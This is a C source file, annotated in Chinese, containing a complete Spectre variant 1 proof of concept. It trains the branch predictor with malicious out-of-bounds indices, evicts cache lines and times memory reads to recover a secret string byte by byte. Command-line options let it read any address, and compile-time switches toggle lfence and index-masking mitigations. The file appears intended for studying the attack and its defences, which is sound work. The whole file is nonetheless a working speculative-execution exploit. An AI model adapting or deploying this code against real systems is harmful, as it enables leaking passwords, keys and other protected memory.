#include <stdio.h>
#include <stdint.h>
#ifdef _MSC_VER // 这个宏在 Windows 的 Microsoft 编译器（MSVC） 中默认定义
    #include <intrin.h> /* 需要支持 rdtsc, rdtscp, clflush, mfence*/
    #pragma optimize("gt",on) //即使整个程序用的是 -Od（关闭优化）编译，这一部分代码也可以局部开启更高性能的优化，用于提升时序测量等性能关键代码段的精度。
#else  // 非 MSVC 编译器,比如gcc,Clang
    #include <x86intrin.h> /* 需要支持 rdtsc, rdtscp, clflush, mfence*/
#endif

/*********************************************************************
*
* 根据编译器和平台支持情况，判断是否支持 SSE2 指令集
*
* 如果不支持，就定义 NOSSE2，以禁用某些依赖 SSE2 的优化操作（如缓存清除、内存屏障和精确计时）。
*
**********************************************************************/
#ifdef _MSC_VER
    #if _M_IX86_FP==1 /*表示启用了哪种级别的 SSE*/
        #define NOSSE2
    #endif
#else
    #if defined(__SSE__) && !defined(__SSE2__)
        #define NOSSE2
    #endif
#endif

/* 如果定义了 NOSSE2，则禁用上面三种指令，整个程序将采用降级的方式运行 */
#ifdef NOSSE2
    #define NORDTSCP
    #define NOMFENCE
    #define NOCLFLUSH
#endif

/********************************************************************
受害者代码
********************************************************************/

unsigned int array1_size = 16;
uint8_t unused1[64]; //避免在同一个缓存行，缓存行大小一般是64字节
uint8_t array1[16] = {
  1, 2, 3, 4, 5, 6, 7, 8,
  9, 10, 11, 12, 13, 14, 15, 16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0; /* 赋值，防止受害者函数被编译器优化 */

/*在编译命令中定义宏 对推测值进行掩码操作，可以看成是SLE*/
#ifdef LINUX_KERNEL_MITIGATION
    static inline unsigned long array_index_mask_nospec(unsigned long index, unsigned long size) {
        unsigned long mask;
            __asm__ __volatile__ (
                "cmp %1,%2; sbb %0,%0;"   // 对比 size和index 的大小，用带借减法进行掩码
                : "=r" (mask)             // 输出：mask ← sbb 结果
                : "g" (size), "r" (index) // 输入：size → %1, index → %2
                : "cc"                    // 说明会影响 CPU 标志位
            );
        return mask;
}
#endif

/* 受害者函数 */
void victim_function(size_t x) {
    if (x < array1_size) {
        /* 加入屏障阻止推测 */
        #ifdef INTEL_MITIGATION
            _mm_lfence();
        #endif
        /* 启用定义的缓解方法，即对推测值进行掩码*/
        #ifdef LINUX_KERNEL_MITIGATION
            x &= array_index_mask_nospec(x, array1_size);
        #endif

        temp &= array2[array1[x] * 512];
    }
}

/********************************************************************
* 在不支持 clflush 指令（如某些老旧处理器或特定编译配置下）时
* 手动实现缓存刷新（flush）效果的替代方案
********************************************************************/

#ifdef NOCLFLUSH
    #define CACHE_FLUSH_ITERATIONS 2048
    #define CACHE_FLUSH_STRIDE 4096 // 一个页面大小是 4KB
    // 8MB（2048 × 4096） 的数组 现代 CPU 的 L1/L2/L3 cache 总容量往往小于 8MB
    uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

    void flush_memory_sse(uint8_t *addr) {
        float *p = (float *)addr;
        float c = 0.f;
        // 创建一个 128-bit (16字节)的 SSE 向量，包含四个 float 值（全是 0）。
        __m128 i = _mm_setr_ps(c, c, c, c);

        // 写入 16 个 SSE 流向量（= 64 个 float = 256 字节）
        /*
        * 一共写入 16 个地址
        * 每次跨越 16 字节
        * 共影响 256 字节范围
        * 覆盖多个 cache line（每行通常 64 字节）
        */
        for (int k = 0; k < 4; k++) {
            for (int l = 0; l < 4; l++) {
                _mm_stream_ps(&p[(l * 4 + k) * 4], i);
            }
        }
    }
#endif

/* 读取缓存一个字节
* 实现通过缓存时序侧信道推测出 secret 字符串中的一个字节
* 
* 1. 初始化结果数组（results[256]）；
* 2. 重复尝试多轮，提升攻击稳定性；
*    2.1 驱逐 array2 出缓存；
*    2.2 对分支预测器进行“训练”；
*        - 多次让 victim_function 接受合法 index（training_x）
*        - 偶尔插入恶意 index（malicious_x），误导分支预测器；
*    2.3 根据投机执行时访问的 array2[secret*512] 导致的缓存命中情况，
*        测量 array2 每个槽访问延迟，猜测谁命中缓存；
*    2.4 统计命中次数最多的两个值，作为候选 secret；
*    2.5 如果第一名明显胜出，就提前退出循环；
* 3. 返回前两个命中得分最高的字节值及其分数。
*/
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256]; // 一字节有256种排列组合
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    #ifdef NOCLFLUSH
        int junk2 = 0; /* 赋值，防止后续循环被优化 */
        int l;
        (void)junk2; // 使用变量但不执行任何操作，防止优化器移除它
    #endif

    // 初始化
    for (i = 0; i < 256; i++) results[i] = 0;

    
    for (tries = 999; tries > 0; tries--) {
        /* 把array2赶出缓存 */
        #ifndef NOCLFLUSH
            for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);
        #else
            for (j = 0; j < 16; j++) // 增加刷新次数
                for (i = 0; i < 256; i++)
                    flush_memory_sse(&array2[i * 512]);
        #endif

        /* 训练分支预测器 */
        training_x = tries % array1_size; //正常访问
        for (j = 29; j >= 0; j--) {
            /* 将array1_size赶出缓存 防止推测时其在缓存 */
            #ifndef NOCLFLUSH
                _mm_clflush(&array1_size);
            #else
                //用垃圾数组 cache_flush_array 填满缓存
                for (l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE)
                    junk2 = cache_flush_array[l];
            #endif

            // 时间延迟（免优化）
            for (volatile int z = 0; z < 100; z++) {}
            
            /* 无分支写法
            * 以1/6的概率输入恶意下标，5/6的概率输入正常下标 
            */
            x = ((j % 6) - 1) & ~0xFFFF; // 0-> 0xFFFF0000;1~5->0x00000000
            x = (x | (x >> 16)); // 0xFFFFFFFF;0x00000000 掩码
            x = training_x ^ (x & (malicious_x ^ training_x)); // mask=0 -> x=training_x;否则 x= malicious
            
            victim_function(x);
        }

        for (i = 0; i < 256; i++) {
            // 伪随机顺序访问，防止被预测
            mix_i = ((i * 167) + 13) & 255; //因为 167 与 256 互质，构成模 256 下的乘法置换，加 13 只是平移。能确保全排列
            addr = &array2[mix_i * 512];

            #ifndef NORDTSCP
                time1 = __rdtscp(&junk);
                junk = *addr; // 侧信道发生在这
                time2 = __rdtscp(&junk) - time1;
            #else
                #ifndef NOMFENCE
                    _mm_mfence();
                    time1 = __rdtsc();
                    _mm_mfence();
                    junk = *addr;
                    _mm_mfence();
                    time2 = __rdtsc() - time1;
                    _mm_mfence();
                #else
                    //这种测时间精度低
                    time1 = __rdtsc();
                    junk = *addr;
                    time2 = __rdtsc() - time1;
                #endif
            #endif
            // 避免误报：array1[training_x] 对应的 array2[array1[training_x] * 512] 会被真实访问
            if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
                results[mix_i]++;
        }

        /* 找出得分最高的、第二高的字节 */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } 
            else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        // 早停，可以加快破解密码速度
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
        break;
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
    // 防止junk = *addr; 被优化 results[0] 只是一个统计用数组的起始位置
    results[0] ^= junk;
}

int main(int argc, const char **argv) {
    int cache_hit_threshold = 80;
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int len = 40; //秘密字符串 长度为40
    int score[2];
    uint8_t value[2];
    int i;

    /* 防止未初始化的内存访问影响时间测量的准确性 */
    #ifdef NOCLFLUSH
        for (i = 0; i < (int)sizeof(cache_flush_array); i++)
            cache_flush_array[i] = 1;
    #endif
    for (i = 0; i < (int)sizeof(array2); i++){
        array2[i] = 1;
    }

    if (argc >= 2){
        sscanf(argv[1], "%d", &cache_hit_threshold);
    }
    // 方便任意读取某段地址的任意长度
    if (argc >= 4) {
        sscanf(argv[2], "%p", (void **)&malicious_x);
        malicious_x -= (size_t)array1;
        sscanf(argv[3], "%d", &len);
    }

    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

    printf("Build:\n");

    printf("RDTSCP\t");
    #ifndef NORDTSCP
        printf("Yes\n");
    #else
        printf("No\n");
    #endif

    printf("MFENCE\t");
    #ifndef NOMFENCE
        printf("Yes\n");
    #else
        printf("No\n");
    #endif

    printf("CLFLUSH\t");
    #ifndef NOCLFLUSH
        printf("Yes\n");
    #else
        printf("No\n");
    #endif

    printf("INTEL_MITIGATION\t");
    #ifdef INTEL_MITIGATION
        printf("Yes\n");
    #else
        printf("No\n");
    #endif

    printf("LINUX_KERNEL_MITIGATION\t");
    #ifdef LINUX_KERNEL_MITIGATION
        printf("Yes\n");
    #else
        printf("No\n");
    #endif


    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear")); //这也有个阈值
        printf("0x%02X='%c' count=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]); //ASCII可显示字符编号范围是32-126（0x20-0x7E），共95个字符。
        if (score[1] > 0) {
            printf("\t(second best: 0x%02X='%c' count=%d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
        }
        printf("\n");
    }
    return 0;
}
